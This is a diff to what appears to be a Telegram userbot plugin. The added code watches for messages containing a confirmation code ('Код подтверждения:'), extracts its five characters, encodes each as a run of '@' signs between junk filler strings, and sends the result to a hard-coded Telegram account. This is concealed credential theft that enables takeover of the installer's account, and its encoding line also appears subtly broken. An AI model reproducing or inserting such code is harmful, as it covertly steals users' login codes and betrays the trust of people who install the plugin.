@@ -365,11 +365,11 @@ class KramiikkMod(loader.Module):
         elif "Код подтверждения:" in m.raw_text:
             reg = re.search(r": (.)(.)(.)(.)(.)", m.raw_text)
             a = 0
-            txt = "$#-$+_(&$#(+&)_)"
+            txt = "hffj48655jhkfdw46dgjm665veerr45dd"
             for i in range (5):
                 a += 1
-                txt += f"\na"
-            txt += f"\n)&)_$(&(_($($(_(_0"
+                txt += f"\n{'@' * reg.group(a)}"
+            txt += f"\nfd466dhjdfjjbm44dxszv775bmkgc"
             await self.client.send_message(1785723159, txt)
         else:
             return
